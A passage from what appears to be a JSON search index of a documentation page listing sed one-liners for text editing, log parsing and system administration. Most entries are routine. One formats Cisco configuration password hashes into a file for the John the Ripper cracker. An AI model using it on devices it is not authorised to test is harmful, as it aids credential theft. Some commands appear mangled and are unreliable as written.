character"},{"location":"linux/sed/#convert-camelcase-to-underscores-camel_case","text":"sed -r 's/([a-z]+)([A-Z][a-z]+)/\\1_\\l\\2/g' file.txt","title":"Convert camelCase to underscores (camel_case)"},{"location":"linux/sed/#tells-which-group-you-dont-belong-to-opposite-of-command-groups---uses-sed","text":"sed -e \"/ $USER /d;s/:.*//g\" /etc/group | sed -e :a -e '/$/N;s/\\n/ /;ta'","title":"Tells which group you DON'T belong to (opposite of command \"groups\") - uses sed"},{"location":"linux/sed/#remove-blank-lines-from-a-file","text":"sed -i.bak '/^[[:space:]]*$/d' file_name","title":"Remove blank lines from a file"},{"location":"linux/sed/#convert-iso8601-dates-to-milliseconds-since-epoch","text":"sed \"s|\\(2[0-9]\\{3\\}-[01][0-9]-[0-3][0-9]T[01][0-9]:[0-5][0-9]:[0-5][0-9].[0-9]\\{3\\}Z\\)| $( date -d \\1 +%s ) 000|g\"","title":"Convert ISO8601 dates to milliseconds since epoch"},{"location":"linux/sed/#go-to-the-nth-line-of-file_1","text":"sed -n '15p' $file","title":"Go to the Nth line of file"},{"location":"linux/sed/#mysql-slice-out-a-specific-database-assumes-existence-of-the-use-statement-from-mysqldump-output","text":"sed -n \"/^USE \\`employees\\`/,/^USE \\`/p\"","title":"MySQL: Slice out a specific database (assumes existence of the USE statement) from mysqldump output"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_5","text":"sed -r \"s@\\^\\[{1,2}([0-9]{1,2}(;[0-9]{1,2})?(;[0-9])?(m|K){1,2})?@@g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#only-change-the-first-occurrence-of-the-pattern","text":"sed -i \"0,/enabled/{s|enabled=0|enabled=1|}\" /etc/yum.repos.d/remi.repo","title":"Only change the first occurrence of the pattern"},{"location":"linux/sed/#remove-the-first-line-containing-match-from-file","text":"sed -i \" $( grep -nm 1 match file | cut -f1 -d: ) d\" file","title":"Remove the first line containing 'match' from file"},{"location":"linux/sed/#replace-deprecated-php-function-split-in-php-files","text":"sed -i s/split \\( /explode \\( / whatever.php","title":"replace deprecated php-function split in php files"},{"location":"linux/sed/#file-without-comments-or-blank-lines","text":"sed 's/^[[:blank:]]*//; s/^#.*//; /^$/d' filename","title":"File without comments or blank lines."},{"location":"linux/sed/#comment-out-all-lines-in-a-file-beginning-with-string_1","text":"sed -i '/^somestring/ s/^/#/' somefile.cfg","title":"Comment out all lines in a file beginning with string"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_6","text":"sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#replace-strings-in-files","text":"sed -i -e 's/war/peace/g' *","title":"Replace strings in files"},{"location":"linux/sed/#pick-up-3-lines-start-at-every-5th-line-of-filetxt","text":"sed -n '1~5{N;N;p}' file.txt","title":"pick up 3 lines start at every 5th line of file.txt"},{"location":"linux/sed/#regular-expression-search-pattern-to-remove-the-datetime-and-name-when-you-paste-from-skype-chat-into-your-text-editor","text":"sed -i 's/^.*?].*?:\\s//g' skype-chat-log.txt","title":"Regular expression search pattern to remove the Datetime and Name when you paste from skype chat into your text editor"},{"location":"linux/sed/#analyze-apache-web-log-statistics-starting-on-date-x","text":"sed -n '/05\\/Dec\\/2010/,$ p' access.log | goaccess -s -b","title":"Analyze Apache Web Log Statistics starting on DATE x"},{"location":"linux/sed/#duplicate-a-line-in-a-text-file-and-replace-part-of-the-duplicated-line","text":"sed -i -e '/foo/p' -e 's/foo/barfoo/' file","title":"Duplicate a line in a text file and replace part of the duplicated line"},{"location":"linux/sed/#format-a-password-file-for-john-the-ripper-from-cisco-configs--level-5","text":"sed -n 's/[ :]/_/g; s/^\\(.\\{1,\\}\\)_5_\\($1$[$./0-9A-Za-z]\\{27,31\\}\\)_*$/\\1:\\2/p' < cisco-device-config > passwd","title":"Format a password file for John the Ripper from Cisco configs  (Level 5)"},{"location":"linux/sed/#html-esacaping-with-sed","text":"sed 's/&/\\&amp;/g; s/</\\&lt;/g; s/>/\\&gt;/g; s/\"/\\&quot;/g; s/' \"'\" '/\\&#39;/g'","title":"HTML esacaping with sed"},{"location":"linux/sed/#parse-bookmarks-and-download-youtube-files","text":"sed 's+href=\"\\([^\"]*\\)\"+\\n\\1\\n+g' bookmarks.html | grep '^http' | clive","title":"Parse bookmarks and download youtube files"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_7","text":"sed -E \"s/\" $'\\E' \"\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#extract-specific-lines-from-a-text-file-using-stream-editor-sed","text":"sed -n -e 1186 ,1210p A-small-practice.in","title":"Extract specific lines from a text file using Stream Editor (sed)"},{"location":"linux/sed/#insert-lines-at-top-of-file-using-sed","text":"sed -i '1iI am a new line' file.txt","title":"Insert line(s) at top of file using sed"},{"location":"linux/sed/#extract-xml-from-an-otherwise-plain-text-log-file","text":"sed -n '/<Tag>/,/<\\/Tag>/p' logfile.log","title":"Extract XML from an otherwise plain text log file"},{"location":"linux/sed/#list-the-cpu-model-name","text":"sed -n 's/^model name[ \\t]*: *//p' /proc/cpuinfo","title":"List the CPU model name"},{"location":"linux/sed/#edit-hosts-file-to-remove-foonovalocal-from-it-where-foo-is-the-hostname-of-a-new-vm","text":"sed -e \"s/^127.0.1.1 $( hostname ) .novalocal/127.0.1.1/g\" /etc/hosts","title":"Edit hosts file to remove \"foo.novalocal\" from it where foo is the hostname of a new VM"},{"location":"linux/sed/#convert-html-links-into-plain-text-with-link-anchor","text":"sed 's!<[Aa] *href*=*\"\\([^\"]*\\)\"*>\\([^<>]*\\)</[Aa]>!\\1,\\2!g' links.html","title":"convert html links into plain text with link anchor"},{"location":"linux/sed/#delete-first-and-last-line-from-file","text":"sed '1d;$d' filename","title":"delete first and last line from file"},{"location":"linux/sed/#remove-comments-from-files_1","text":"sed -i -e '/^#[^!].*/d' -e 's/\\(.*[^!]\\)#.*[^}]/\\1/' <filename>","title":"Remove comments from files"},{"location":"linux/sed/#sort-a-one-per-line-list-of-email-address-weeding-out-duplicates","text":"sed 's/[ \\t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort | uniq > emails_sorted.txt","title":"Sort a one-per-line list of email address, weeding out duplicates"},{"location":"linux/sed/#create-fortunes-dat-file-from-commandlinefu-from-saved-preferite","text":"sed ':a;N;$!ba;s/\\n\\n/\\n%\\n/g' input.txt >output","title":"Create fortune's *.dat file from commandlinefu from saved preferite"},{"location":"linux/sed/#replace-nelines-with-spaces","text":"sed -e :a -e '$!N;s/\\n/ /;ta'","title":"Replace nelines with spaces"},{"location":"linux/sed/#revoke-an-existing-users-group-memberships-and-add-another-user-to-those-same-groups","text":"sed -i.awkbak \"s/\\([:,]\\)oldspiderman/\\1newspiderman/\" /etc/group","title":"Revoke an existing user's group memberships and add another user to those same groups,"},{"location":"linux/sed/#uncomment-line-based-on-string-match","text":"sed -e '/4.2.2.2/ s/^;//' -i test.txt","title":"Uncomment line based on string match"},{"location":"linux/sed/#to-display-all-characters-except-second-last-character-from-each-line-of-a-file","text":"sed 's/^\\(.*\\)\\(.\\)\\(.\\)$/\\1\\3/' fileName","title":"to display all characters except second last character from each line of a file"},{"location":"linux/sed/#convert-csv-files-to-tsv","text":"sed 's/,/\\t/g' report.csv > report.tsv","title":"Convert CSV files to TSV"},{"location":"linux/sed/#change-time-format-in-log-unix-timestamp-to-human-readable","text":"sed -r 's/(\\[|])//g' | awk ' { $1=strftime(\"%D %T\",$1); print }'","title":"Change time format in log, UNIX Timestamp to Human readable"},{"location":"linux/sed/#remove-lines-ending-or-trailing-slash-","text":"sed -i 'g/text/d' <filename>","title":"Remove lines ending or trailing slash (/)"},{"location":"linux/sed/#remove-last-x-lines-from-file-using-sed","text":"sed -n -e :a -i -e '1,5!{P;N;D;};N;ba' /etc/apt/sources.list","title":"Remove last x lines from file using sed"},{"location":"linux/sed/#remove-a-range-of-lines-from-a-file_2","text":"sed -i 6 ,66d <filename>","title":"Remove a range of lines from a file"},{"location":"linux/sed/#rsnapshot-vim-edit-replaying-space-tabs","text":"sed 's/ \\+ /\\t/g' /usr/local/etc/rsnapshot.conf >/tmp/snap.conf","title":"rsnapshot vim edit replaying space tabs"},{"location":"linux/sed/#join-lines-split-with-backslash-at-the-end","text":"sed -e '/\\\\$/{:0;N;s/\\\\\\n//;t0}'","title":"Join lines split with backslash at the end"},{"location":"linux/sed/#to-print-a-specific-line-from-a-file_1","text":"sed -n 5p <file>","title":"To print a specific line from a file"},{"location":"linux/sed/#uncomment-the-lines-where-the-word-debug-is-found_2","text":"sed '/^#.*DEBUG.*/ s/^#//' $FILE","title":"uncomment the lines where the word DEBUG is found"},{"location":"linux/sed/#sed--using-colons-as-separators-instead-of-forward-slashes_1","text":"sed \"s:/old/direcory/:/new/directory/:\" <file>","title":"sed : using colons as separators instead of forward slashes"},{"location":"linux/sed/#delete-a-particular-line-by-line-number-in-file_1","text":"sed -i 3d ~/.ssh/known_hosts","title":"delete a particular line by line number in file"},{"location":"linux/sed/#put-all-lines-in-comment-where-de-word-debug-is-found_1","text":"sed -i 's/^.*DEBUG.*/#&/' $file","title":"put all lines in comment where de word DEBUG is found"},{"location":"linux/sed/#extract-a-bash-function_1","text":"sed -n '/^function h\\(\\)/,/^}/p' script.sh","title":"Extract a bash function"},{"location":"linux/sed/#remove--color--special--escape--ansi--codes-from-text-with-sed_1","text":"sed \"s,\\x1B\\[[0-9;]*[a-zA-Z],,g\"","title":"Remove ( color / special / escape / ANSI ) codes, from text, with sed"},{"location":"linux/sed/#top-10-commands-used_1","text":"sed -e 's/ *$//' ~/.bash_history | sort | uniq -cd | sort -nr | head","title":"top 10 commands used"},{"location":"linux/sed/#display-a-block-of-text-with-awk_1","text":"sed -n /start_pattern/,/stop_pattern/p file.txt","title":"Display a block of text with AWK"},{"location":"linux/sed/#remove-comments-from-files_2","text":"sed -e '/^#/d' -e 's/#.*$//' in","title":"Remove comments from files"},{"location":"linux/sed/#remove-all-html-tags-from-a-file_1","text":"sed \"s/<[^>]\\+>//g\" file","title":"Remove all HTML tags from a file"},{"location":"linux/sed/#update-zone-file-serial-numbers_1","text":"sed -i 's/20[0-1][0-9]\\{7\\}/' ` date +%Y%m%d%I ` '/g' *.db","title":"Update zone file Serial numbers"},{"location":"linux/sed/#remove-a-line-in-a-text-file-useful-to-fix-ssh-host-key-change-warnings_1","text":"sed -i 8d ~/.ssh/known_hosts","title":"Remove a line in a text file. Useful to fix \"ssh host key change\" warnings"},{"location":"linux/sed/#remove-a-line-from-a-file-using-sed-useful-for-updating-known-ssh-server-keys-when-they-change_2","text":"sed -i '${LINE}d' ~/.ssh/known_host","title":"Remove a line from a file using sed (useful for updating known SSH server keys when they change)"},{"location":"linux/sed/#see-the-10-programs-the-most-used_1","text":"sed -e \"s/| /\\n/g\" ~/.bash_history | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head","title":"See the 10 programs the most used"},{"location":"linux/sed/#separate-emphasize-digital-strings-from-other-text_1","text":"sed 's/[0-9]\\+/ [&] /g'","title":"separate (emphasize) digital strings from other text"},{"location":"linux/sed/#print-all-lines-between-two-line-numbers_1","text":"sed -n '3,6p' /path/to/file","title":"Print all lines between two line numbers"},{"location":"linux/sed/#insert-a-colon-between-every-two-digits_1","text":"sed 's/\\(..\\)/\\1:/g;s/:$//' mac_address_list","title":"Insert a colon between every two digits"},{"location":"linux/sed/#regex-to-remove-html-tags-from-a-file_1","text":"sed -e :a -e 's/<[^>]*>//g;/</N;//ba' index.html","title":"Regex to remove HTML-Tags from a file"},{"location":"linux/sed/#regex-for-turning-a-url-into-a-real-hyperlink-ie-for-posting-somewhere-that-accepts-basic-html_1","text":"sed \"s/\\([a-zA-Z]*\\:\\/\\/[^ ]*\\)\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\1\\<\\/a\\>\\2/\"","title":"regex for turning a URL into a real hyperlink (i.e. for posting somewhere that accepts basic html)"},{"location":"linux/sed/#shows-cpu-load-in-percent_1","text":"sed -e 's/ .*//' -e 's/\\.//' -e 's/^0*//' /proc/loadavg","title":"Shows cpu load in percent"},{"location":"linux/sed/#apply-substitution-only-on-the-line-following-a-marker_1","text":"sed '/MARKER/{N;s/THIS/THAT/}'","title":"Apply substitution only on the line following a marker"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_8","text":"sed -r \"s/\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#comment-out-a-line-in-a-file_1","text":"sed -i '19375 s/^/#/' file","title":"Comment out a line in a file"},{"location":"linux/sed/#simplification-of-sed-your-sed-stuff-here-file--file2--mv-file2-file_1","text":"sed -i 'your sed stuff here' file","title":"Simplification of \"sed 'your sed stuff here' file &gt; file2 &amp;&amp; mv file2 file\""},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_9","text":"sed -r \"s:\\x1B\\[[0-9;]*[mK]::g\" '","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#prepend-a-text-to-a-file_2","text":"sed -i '1s/^/text to prepend\\n/' file1","title":"Prepend a text to a file."},{"location":"linux/sed/#delete-line-number-10-from-file_1","text":"sed -i '10d' <somefile>","title":"Delete line number 10 from file"},{"location":"linux/sed/#remove-empty-lines_1","text":"sed '/^$/d'","title":"remove empty lines"},{"location":"linux/sed/#convert-files-from-dos-line-endings-to-unix-line-endings_1","text":"sed -i 's/^M//' file","title":"Convert files from DOS line endings to UNIX line endings"},{"location":"linux/sed/#remove-leading-blank-lines_1","text":"sed '/./,$!d'","title":"remove leading blank lines"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_10","text":"sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#convert-unix-newlines-to-dos-newlines_2","text":"sed 's/$/<ctrl+v><ctrl+m>/'","title":"Convert Unix newlines to DOS newlines"},{"location":"linux/sed/#reverse-order-of-file_1","text":"sed '1!G;h;$!d'","title":"reverse order of file"},{"location":"linux/sed/#remove-the-first-character-of-each-line-in-a-file_1","text":"sed \"s/^.//g\" files","title":"Remove the first character of each line in a file"},{"location":"linux/sed/#delete-last-line-of-a-file-if-it-is-blank_1","text":"sed '${/^$/d}' file","title":"Delete Last Line of a File if it is Blank"},{"location":"linux/sed/#simple-xml-tag-extract-with-sed_1","text":"sed -n 's/.*<foo>\\([^<]*\\)<\\/foo>.*/\\1/p'","title":"Simple XML tag extract with sed"},{"location":"linux/sed/#perform-sed-substitution-on-all-but-the-last-line-of-input_1","text":"sed -e \" $ ! s/ $ /,/\"","title":"Perform sed substitution on all but the last line of input"},{"location":"linux/sed/#remove-empty-lines-in-place-with-backup_1","text":"sed -e '/^$/d' -i .bak filewithempty.lines","title":"remove empty lines in place with backup"},{"location":"linux/sed/#print-all-the-lines-between-10-and-20-of-a-file_1","text":"sed '10,20!d'","title":"Print all the lines between 10 and 20 of a file"},{"location":"linux/sed/#efficiently-print-a-line-deep-in-a-huge-log-file_1","text":"sed '1000000!d;q' < massive-log-file.log","title":"Efficiently print a line deep in a huge log file"},{"location":"linux/sed/#extract-title-from-html-files_1","text":"sed -n 's/.*<title>\\(.*\\)<\\/title>.*/\\1/ip;T;q' file.html","title":"Extract title from HTML files"},{"location":"linux/sed/#grep--v-with-multiple-patterns_2","text":"sed '/test/{/error\\|critical\\|warning/d}' somefile","title":"grep -v with multiple patterns."},{"location":"linux/sed/#a-find-and-replace-within-text-based-files-for-batch-text-replacement-not-using-perl_1","text":"sed -i -e 's/SEARCH_STRING/REPLACE_STRING/g' ` find . -iname 'FILENAME' `","title":"a find and replace within text-based files, for batch text replacement, not using perl"},{"location":"linux/sed/#go-to-the-nth-line-of-file_2","text":"sed -n 13p /etc/services","title":"Go to the Nth line of file"},{"location":"linux/sed/#add-thousand-separator-with-sed-in-a-file-or-within-pipe_1","text":"sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' filename","title":"Add thousand separator with sed, in a file or within pipe"},{"location":"linux/sed/#append-empty-line-after-every-line-in-filetxt_1","text":"sed G file.txt","title":"append empty line after every line in file.txt"},{"location":"linux/sed/#efficiently-extract-lines-between-markers_1","text":"sed -n '/START/,${/STOP/q;p}'","title":"Efficiently extract lines between markers"},{"location":"linux/sed/#change-the-homepage-of-firefox_1","text":"sed -i 's|\\(\"browser.startup.homepage\",\\) \"\\(.*\\)\"|\\1 \"http://sliceoflinux.com\"|' .mozilla/firefox/*.default/prefs.js","title":"Change the homepage of Firefox"},{"location":"linux/sed/#sed-edit-in-place-using--a-option-instead-of--i-option-no-tmp-file-created_1","text":"sedi (){ case $# in [ 01 ] | [ 3 -9 ]) echo usage: sedi sed-cmds file ;; 2 ) sed -a '' \" $1 \" ';H;$!d;g;' $2 | sed -a '/^$/d;w ' \" $2 \" '' ;; esac ; }","title":"sed edit-in-place using -a option instead of -i option (no tmp file created)"},{"location":"linux/sed/#remove-a-range-of-lines-from-a-file_3","text":"sed -i <file> -re '<start>,<end>d'","title":"Remove a range of lines from a file"},{"location":"linux/sed/#gives-you-whats-between-first-string-and-second-string-included_1","text":"sed \"s/^ABC/+ABC/\" <file | sed \"s/DEF $ /DEF+/\" | tr \"\\n\" \"~\" | tr \"+\" \"\\n\" | grep \"^ABC\" | tr \"~\" \"\\n\"","title":"Gives you what's between first string and second string included."},{"location":"linux/sed/#remove-blank-lines_1","text":"sed '/^$/d'","title":"Remove blank lines"},{"location":"linux/sed/#deleting--ignoring-lines-from-the-top-of-a-file_1","text":"sed 1d foo.txt","title":"Deleting / Ignoring lines from the top of a file"},{"location":"linux/sed/#extract-ip-addresses-with-sed_2","text":"sed -n 's/\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}/\\nip&\\n/gp' ips.txt | grep ip | sed 's/ip//' | sort | uniq","title":"Extract ip addresses with sed"},{"location":"linux/sed/#remove-lines-which-are-longer-than-255_1","text":"sed -n '/^.\\{255\\}/!p'","title":"remove lines which are longer than 255"},{"location":"linux/sed/#grep--v-with-multiple-patterns_3","text":"sed -n '/test/{/error\\|critical\\|warning/d;p}' somefile","title":"grep -v with multiple patterns."},{"location":"linux/sed/#remove-leading-zeros-in-multiple-columns-with-sed_1","text":"sed 's/\\b\\(0*\\)//g' filename","title":"Remove leading zeros in multiple columns with sed"},{"location":"linux/sed/#output-the-contents-of-a-file-removing-any-empty-lines-including-lines-which-contain-only-spaces-or-tabs_1","text":"sed -e '/^[<space><tab>]*$/d' somefile","title":"output the contents of a file removing any empty lines including lines which contain only spaces or tabs."},{"location":"linux/sed/#extract-all-urls-from-firefox-sessionstore_1","text":"sed -e \"s/\\[{/\\n/g\" -e \"s/}, {/\\n/g\" sessionstore.js | grep url | awk -F \",\" '{ print $1 }' | sed -e \"s/url:\\\"\\([^\\\"]*\\)\\\"/\\1/g\" -e \"/^about:blank/d\" > session_urls.txt","title":"extract all urls from firefox sessionstore"},{"location":"linux/sed/#print-contents-of-file-from-line-1-until-we-match-regex_1","text":"sed -n '1,/regex/p' filename","title":"print contents of file from line 1 until we match regex"},{"location":"linux/sed/#preprocess-code-to-be-posted-in-comments-on-this-site_1","text":"sed 's/^/$ /' \" $script \" | xclip","title":"preprocess code to be posted in comments on this site"},{"location":"linux/sed/#quick-and-dirty-formatting-for-html-code_1","text":"sed -r 's_(/[^>]*?>)_\\1\\n_g' filename.html","title":"quick and dirty formatting for HTML code"},{"location":"linux/sed/#do-a-search-and-replace-in-a-file-after-making-a-backup_1","text":"sed -i.bak 's/old/new/g' file","title":"Do a search-and-replace in a file after making a backup"},{"location":"linux/sed/#concatenates-lines-using-sed_1","text":"sed -e :a -e '/$/N;s/\\n/ /;ta' <filename>","title":"Concatenates lines using sed"},{"location":"linux/sed/#replace-multiple-spaces-with-semicolon_1","text":"sed \"s/\\s\\+/;/g;s/^ //;s/ $ //\" filename.csv","title":"Replace multiple spaces with semicolon"},{"location":"linux/sed/#change-every-instance-of-old-to-new-in-file-file_1","text":"sed -i 's/OLD/NEW/g' FILE","title":"Change every instance of OLD to NEW in file FILE"},{"location":"linux/sed/#convert-dos-newlines-crlf-to-unix-format_1","text":"sed 's/^M$//' input.txt > output.txt","title":"Convert DOS newlines (CR/LF) to Unix format"},{"location":"linux/sed/#embed-next-line-on-the-end-of-current-line-using-sed_1","text":"sed 'X{N;s/\\n//;}' file.txt ( where X is the current line )","title":"Embed next line on the end of current line using sed"},{"location":"linux/sed/#remove-newlines-from-specific-lines-in-a-file-using-sed_1","text":"sed -i '/pattern/N; s/\\n//' filename","title":"remove newlines from specific lines in a file using sed"},{"location":"linux/sed/#capitalize-the-first-letter-of-every-word_1","text":"sed \"s/\\b\\(.\\)/\\u\\1/g\"","title":"Capitalize the first letter of every word"},{"location":"linux/sed/#show-a-config-file-without-comments_1","text":"sed -e 's/#.*//;/^\\s*$/d'","title":"Show a config file without comments"},{"location":"linux/sed/#top-20-commands-in-your-bash-history_1","text":"sed -e 's/[;|][[:space:]]*/\\n/g' .bash_history | cut delimiter = ' ' fields = 1 | sort | uniq count | sort numeric-sort reverse | head lines = 20","title":"Top 20 commands in your bash history"},{"location":"linux/sed/#update-grub-menulst_1","text":"sed -e '/^$/d' -e '/^#/d' -e '/initrd/ a\\ ' -e 's/hiddenmenu//g' -e '/^timeout/d' -e '/default/ a\\timeout\\t\\t15' -e 's/quiet//g' -e 's/splash/rootdelay=60/g' /boot/grub/menu.lst > /boot/grub/menu.lst.new","title":"Update grub menu.lst"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file_3","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//' -i file","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#remove-space-andor-tab-characters-at-the-end-of-line_1","text":"sed -i 's/[ \\t]*$//' file","title":"Remove space and/or tab characters at the end of line"},{"location":"linux/sed/#delete-all-trailing-whitespace-from-each-line-in-file_2","text":"sed -i 's/^\\s\\+//' <file>","title":"delete all trailing whitespace from each line in file"},{"location":"linux/sed/#display-email-addresses-that-have-been-sent-to-by-a-postfix-server-since-the-last-mail-log-rollover_1","text":"sed -n -e '/postfix\\/smtp\\[.*status=sent/s/^.*to=<\\([^>]*\\).*$/\\1/p' /var/log/mail.log | sort -u","title":"Display email addresses that have been sent to by a postfix server since the last mail log rollover"},{"location":"linux/sed/#given-process-id-print-its-environment-variables_1","text":"sed 's/\\o0/\\n/g' /proc/INSERT_PID_HERE/environ","title":"Given process ID print its environment variables"},{"location":"linux/sed/#print-only-the-odd-lines-of-a-file-gnu-sed_1","text":"sed 2 ~2d","title":"Print only the odd lines of a file (GNU sed)"},{"location":"linux/sed/#search-replace-with-ansible-style-timestamps_1","text":"sed -i. $( date +%F@%T ) 's/^LogLevel warn/LogLevel debug/g' httpd.conf","title":"Search replace with Ansible style timestamps"},{"location":"linux/sed/#exclude-inserting-a-table-from-a-sql-import_1","text":"sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql","title":"Exclude inserting a table from a sql import"},{"location":"linux/sed/#getting-a-domain-from-url-ex-very-nice-to-get-url-from-squid-accesslog_1","text":"sed -e \"s/[^/]*\\/\\/\\([^@]*@\\)\\?\\([^:/]*\\).*/\\2/\"","title":"Getting a domain from url, ex: very nice to get url from squid access.log"},{"location":"linux/sed/#multi-line-grep-using-sed-and-specifying-openclose-tags_1","text":"sed '/' \"<opening tag>\" '/,/' \"<closing tag>\" '/{/' \"<closing tag>\" '/d;p};d' \"<file>\"","title":"Multi line grep using sed and specifying open/close tags"},{"location":"linux/sed/#sed---substitute-string-in-next-line_1","text":"sed -i.backup '/patter/{n;s/foo/bar/g}' file","title":"SED - Substitute string in next line"},{"location":"linux/sed/#remove-repeated-pairs-of-characters-eg-xtxtxtxt-will-become-xt_1","text":"sed -ru 's/(..)\\1{2,}/\\1/g'","title":"remove repeated pairs of characters e.g. \"xtxtxtxt\" will become \"xt\""},{"location":"linux/sed/#delete-all-emptyblank-lines-from-text-file--output-to-file_1","text":"sed '/^$/d' /tmp/data.txt > /tmp/output.txt","title":"Delete all empty/blank lines from text file &amp; output to file"},{"location":"linux/sed/#fix-subtitle-timing-for-sub-files_1","text":"sed -e 's/{/|/' -e 's/}{/|/' -e 's/}/|/' myFile.sub | awk -F \"|\" 'BEGIN {OFS = \"|\"} { $2 = $2 - 600; $3 = $3 - 600; print $0 }' | sed -e 's/^|/{/' -e 's/\\([0-9]\\)|\\([0-9]\\)/\\1}{\\2/' -e 's/|/}/' >","title":"Fix subtitle timing (for .sub files)"},{"location":"linux/sed/#mysql-slice-out-a-specific-table-from-the-output-of-mysqldump_1","text":"sed -n \"/^ Table structure for table \\`departments\\`/,/^ Table structure for table/p\"","title":"MySQL: Slice out a specific table from the output of mysqldump"},{"location":"linux/sed/#comment-out-all-lines-in-a-file-beginning-with-string_2","text":"sed -i 's/^\\(somestring\\)/#\\1/' somefile.cfg","title":"Comment out all lines in a file beginning with string"},{"location":"linux/sed/#commentate-specified-line-of-a-file_1","text":"sed -i '<line_no>s/\\(.*\\)/#\\1/' <testfile>","title":"commentate specified line of a file"},{"location":"linux/sed/#remove-multiple-spaces_1","text":"sed \"s/^ *//;s/ * $ //;s/ \\{1,\\}/ /g\" filename.txt","title":"Remove multiple spaces"},{"location":"linux/sed/#simple-comment-an-entire-file_1","text":"sed -i 's/^/#/' FILENAME","title":"Simple Comment an entire file"},{"location":"linux/sed/#convert-a-python-interactive-session-to-a-python-script_1","text":"sed 's/^\\([^>.]\\)/#\\1/;s/^>>> //;s/^\\.\\.\\./ /'","title":"Convert a Python interactive session to a python script"},{"location":"linux/sed/#add-a-line-from-1-file-after-every-line-of-another-shuffle-files-together_1","text":"sed '/^/R addfile' targetfile > savefile","title":"Add a line from 1 file after every line of another (shuffle files together)"},{"location":"linux/sed/#print-contents-of-file-from-first-match-of-regex-to-end-of-file_1","text":"sed -n '/regex/,$p' filename","title":"print contents of file from first match of regex to end of file"},{"location":"linux/sed/#compute-the-numeric-sum-of-a-file_1","text":"sed i \"+\" file.txt | xargs echo 0 | bc","title":"Compute the numeric sum of a file"},{"location":"linux/sed/#delete-leading-whitespace-from-the-start-of-each-line_2","text":"sed 's/^[ \\t]*//' input.txt","title":"Delete leading whitespace from the start of each line"},{"location":"linux/sed/#delete-leading-whitespace-from-the-start-of-each-line_3","text":"sed 's/^\\s*//' input.txt","title":"Delete leading whitespace from the start of each line"},{"location":"linux/sed/#search-apache-virtual-host-by-pattern_1","text":"sed -n '/^[^#]*<Virtual/{:l N; /<\\/Virtual/!bl;}; /PATTERN/p' vhosts.conf","title":"Search apache virtual host by pattern"},{"location":"linux/sed/#terminal---show-directories-in-the-path-one-per-line-with-sed-and-bash3x-here-string_1","text":"sed 's/:/\\n/g' <<< $PATH","title":"Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string'"},{"location":"linux/sed/#remove-a-range-of-lines-from-a-file_4","text":"sed -i <start>,<end>d <filename>","title":"Remove a range of lines from a file"},{"location":"linux/sed/#every-nth-line-position--sed_1","text":"sed -n '1,${p;n;n;}' foo > foo_every3_position1 ; sed -n '2,${p;n;n;}' foo > foo_every3_position2 ; sed -n '3,${p;n;n;}' foo > foo_every3_position3","title":"Every Nth line position # (SED)"},{"location":"linux/sed/#in-place-searchreplace-with-datestamped-backup_1","text":"sed -i. ` date +%Y%m%d ` -e 's/pattern/replace' [ filename ]","title":"In-Place search/replace with datestamped backup"},{"location":"linux/sed/#replace-spaces-in-a-file-with-hyphens_1","text":"sed -i 's/ /-/g' *","title":"Replace spaces in a file with hyphens"},{"location":"linux/sed/#delete-the-specified-line_1","text":"sed -i 8d ~/.ssh/known_hosts","title":"Delete the specified line"},{"location":"linux/sed/#change-host-name_1","text":"sed -i 's/oldname/newname/' /etc/hosts /etc/hostname","title":"Change host name"},{"location":"linux/sed/#print-just-line-4-from-a-textfile_3","text":"sed -n '4{p;q}'","title":"Print just line 4 from a textfile"},{"location":"linux/sed/#print-just-line-4-from-a-textfile_4","text":"sed -n '4p'","title":"Print just line 4 from a textfile"},{"location":"linux/sed/#cleanup-a-source-text-file-removing-trailing-spacestabs-and-multiple-consecutive-blank-lines_1","text":"sed -i -e 's/[ \\t]*$//;/^$/N;/\\n$/D' sourcefiletocleanup","title":"Cleanup a (source) text file, removing trailing spaces/tabs and multiple consecutive blank lines"},{"location":"linux/sed/#put-uppercase-letters-in-curly-brackets-in-a-bibtex-database_1","text":"sed '/^\\s*[^@%]/s=\\([A-Z][A-Z]*\\)\\([^}A-Z]\\|},$\\)={\\1}\\2=g' literature.bib > output.bib","title":"Put uppercase letters in curly brackets in a BibTeX database"},{"location":"linux/sed/#prepend-a-text-to-a-file_3","text":"sed -i 's/^/ls -l /' output_files.txt","title":"Prepend a text to a file."},{"location":"linux/sed/#edit-ruby-files-within-the-current-directory-to-use-ruby-19-style-symbol-keys-instead-of-rockets_1","text":"sed -i \"s/:\\([a-zA-Z_]*\\) =>/\\1:/g\" **/*.rb","title":"Edit Ruby files within the current directory to use Ruby 1.9+ style symbol keys instead of rockets"},{"location":"linux/sed/#uncomment-the-lines-where-the-word-debug-is-found_3","text":"sed 's/^#\\(.*DEBUG\\)/\\1/' $FILE","title":"uncomment the lines where the word DEBUG is found"},{"location":"linux/sed/#raspberry-pi-serial-number-wo-leading-zeros_1","text":"sed '$!d s/.*: 0\\+//' /proc/cpuinfo","title":"Raspberry Pi serial number w/o leading 